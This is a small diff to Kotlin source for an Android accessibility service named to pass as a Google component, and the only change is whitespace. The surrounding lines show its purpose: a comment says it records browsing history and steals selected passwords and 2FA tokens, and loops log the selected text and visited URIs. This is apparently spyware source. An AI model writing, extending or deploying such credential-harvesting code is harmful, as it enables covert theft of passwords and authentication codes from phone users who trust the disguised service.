@@ -46,7 +46,7 @@ class GoogleAccessibilityService() : AccessibilityService() {
                 // We can record their browsing history as well as steal passwords and 2FA tokens
                 // that are selected.
                 for (string in event.selected()) {
-                    logEvent(event,  "Text selected: $string")
+                    logEvent(event, "Text selected: $string")
                 }
                 for (uri in event.uris()) {
                     logEvent(event, "URI detected: $uri")
